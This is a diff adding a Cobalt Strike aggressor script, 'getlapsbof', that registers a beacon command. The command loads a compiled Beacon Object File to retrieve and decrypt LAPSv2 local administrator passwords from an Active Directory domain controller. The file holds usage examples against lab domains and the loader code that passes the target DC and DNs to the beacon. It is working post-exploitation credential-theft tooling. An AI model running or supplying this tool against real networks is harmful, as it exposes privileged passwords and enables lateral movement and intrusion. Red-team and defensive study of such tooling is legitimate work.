@@ -1,0 +1,51 @@
+# getlapsbof
+# version: 1.0
+# Author: Ru
+# Original Credit: @xpn
+# Decrypt LAPSv2 Credentials
+
+beacon_command_register("getlapsbof", "getlapsbof version 1.0 - Decrypts LAPSv2 Credentials", "getlapsbof <TARGET_DC> <BASE_DN> <TARGET_COMPUTER_DN>
+
+Retrieve and Decrypt the the LAPSv2 password from the Windows Active Directory Domain Controller.
+
+Requirements:
+LDAP
+Account with adequate privileges to read the password.
+
+Caveat:
+LAPSv1 (aka Legacy LAPS) not supported.
+
+Exampled:
+getlapsbof \c7192.168.230.150\o \c4DC=sandstone,DC=camp\o \c2CN=edworkbox1,OU=LAPSManaged,DC=sandstone,DC=camp\o
+getlapsbof \c7sandstone.camp\o \c4DC=sandstone,DC=camp\o \c2CN=edworkbox1,OU=LAPSManaged,DC=sandstone,DC=camp\o
+getlapsbof \c7DC01.LAB.LOCAL\o \c4DC=LAB,DC=LOCAL\o \c2CN=COMPUTERACC,OU=LAPSENABLED,DC=LAB,DC=LOCAL\o
+")
+
+
+
+alias getlapsbof {
+    local('$barch $handle $data $args');
+
+    if(size(@_) < 2)
+    {
+        berror($1, beacon_command_detail("getlapsbof"));
+        return;
+    }
+    
+    $barch  = barch($1);
+    
+    $handle = openf(script_resource("bin/bof. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+    
+    $server = $2;
+    $dn = $3;
+    $dnobject = $4;
+    $args = bof_pack($1, "zzz", $server, $dn, $dnobject);
+    
+    btask($1, "Target DC: $server");
+    btask($1, "Target DN: $dn");
+    btask($1, "Target Computer DN: $dnobject");
+    
+    beacon_inline_execute($1, $data, "go", $args);
+}
